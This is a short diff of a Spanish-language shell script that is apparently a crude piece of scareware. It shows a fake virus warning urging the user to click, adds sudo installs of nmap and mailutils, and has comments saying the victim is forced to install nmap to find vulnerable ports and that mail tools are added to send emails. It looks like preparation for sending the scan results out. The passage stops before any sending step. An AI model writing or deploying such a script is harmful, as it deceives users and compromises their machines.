@@ -1,7 +1,9 @@
 echo "Tu pc está siendo escaneado por un virus,pinche aquí para pararlo"
 
- apt install nmap 
- #le quitamos sudo ya que no lo tiene instalado
+ sudo apt install nmap 
+ sudo apt install mailutils
+ #le instalamos mailutils para poder mandar correos
+#se lo volvemos a añadir ya que debe ser usado en máquina linux
 #le obligamos a instalar nmap para descubrir que puertos tiene vulnerable
 
 touch resultado_nmap.txt
